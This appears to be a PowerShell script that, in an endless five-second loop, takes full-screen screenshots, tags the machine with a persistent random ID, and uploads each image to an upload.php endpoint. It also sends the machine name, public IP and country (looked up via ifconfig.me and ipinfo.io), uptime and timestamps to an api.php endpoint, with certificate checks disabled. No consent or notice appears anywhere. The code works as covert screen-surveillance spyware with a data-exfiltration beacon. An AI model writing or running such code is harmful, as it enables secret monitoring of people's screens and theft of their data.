
while (1) {
    $Root = "$PSScriptRoot\";
    $type = ".kld";
    $output = @();
    $ss_img;$id_name_old;$id_name_new;$id;


    # Foreach ($type in $FileType) {
        $files = Get-ChildItem $Root -Filter *$type -Recurse | ? { !$_.PSIsContainer }
        # $output += "$type ---> $($files.Count) files"
        foreach ($file in $files) {
            $output += $file.Name
        }
    # }

    # echo $output.Count;
    # echo $output;

    if($output.Count -eq 1){
        $id_name_old = $output[0] -replace ".{4}$"
        echo $id_name_old;
        $ss_img = $id_name_old;
        $id = $id_name_old;
    }else{
        
        $id_name = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".tochararray();
        $id_name_new = ($id_name | Get-Random -count 18) -join '';
        echo $id_name_new;
        $ss_img = $id_name_new;
        $id = $id_name_new;
        Set-Content "$PSScriptRoot\$id_name_new.kld" "KSP";
    }




    $path = "$PSScriptRoot\$ss_img.png"
    echo $path

    # $targetDir = 'c:\foo\bar' 
    # $res = Start-Process -Wait -FilePath "$PSScriptRoot\Nircmd.exe" -Verb RunAs -ArgumentList "savescreenshotfull", "$path"
    # echo $res
    # $File = "\\SomeLocation\SomeDirectory\MyFancyScreenshot.bmp"
    $File = $path;
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    #ysteher Screen resolution information
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $Screen.width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    # Create bitmap using the top-left and bottom-right bounds
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    # Create Graphics object
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    # Capture screen
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    # Save to file
    $bitmap.Save($File) 
    Write-Output "Screenshot saved to:"
    Write-Output $File

    # Start-Process "$PSScriptRoot\Nircmd.exe" savescreenshotfull "$path" -NoNewWindow -Wait
    # Param([String]$pe)
    # $path = "$PSScriptRoot\Screenshot.png"
    $img_up = [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $http = new-object System.Net.WebClient; $response = $http.UploadFile("http://localhost/upload.php","$path");
    # $img_src = "";

    # $img_src = [convert]::ToBase64String((get-content $path -encoding byte))

    $time = (Get-Date).ToString("h:m:s tt");
    $date = (Get-Date).ToString("d-MMM-yy");
    $datetimeUTC = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffK");

    $ip_info = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content);
    $ip = $ip_info.ip;
    $c_code = $ip_info.country;
    $pc_name = [system.environment]::MachineName;

    $uptime = (get-date) - (gcim Win32_OperatingSystem).LastBootUpTime;
    
    $d = (&{If($($uptime.days) -lt 1) {""} Else {"$($uptime.days)d, "}});
    $h = (&{If($($uptime.Hours) -lt 1) {""} Else {"$($uptime.Hours)h, "}});
    $m = (&{If($($uptime.Minutes) -lt 1) {""} Else {"$($uptime.Minutes)m, "}});
    $s = (&{If($($uptime.Seconds) -lt 1) {""} Else {"$($uptime.Seconds)s, "}});
    # (IIf () "" "");

    $uptime = "$d$h$m$s";

    echo $uptime;
    
    $postParams = @{
        "id" = "$id";
        "name" = "$pc_name";
        "ip" = "$ip";
        "c_code" = "$c_code";
        "img_src" = "$ss_img.png";
        # "img_src" = "data:image/png;base64,$img_src";
        "ltime" = "$time";
        "ldate" = "$date";
        "ftd" = "$uptime";
        "dtUTC" = "$datetimeUTC"
    }
    # powershell (New-Object System.Net.WebClient).UploadFile('http://x.x.x.x/upload.php', '<some_file>');

    $req = Invoke-WebRequest -Uri ("http://localhost/api.php") -Method POST -Body $postParams
    echo $req.Content

    # Function IIf($If, $Right, $Wrong) {If ($If) {$Right} Else {$Wrong}}
    # Function IIf($If, $Then, $Else) {
    #     If ($If -IsNot "Boolean") {$_ = $If}
    #     If ($If) {If ($Then -is "ScriptBlock") {&$Then} Else {$Then}}
    #     Else {If ($Else -is "ScriptBlock") {&$Else} Else {$Else}}
    # }

    Start-Sleep -Seconds 5
}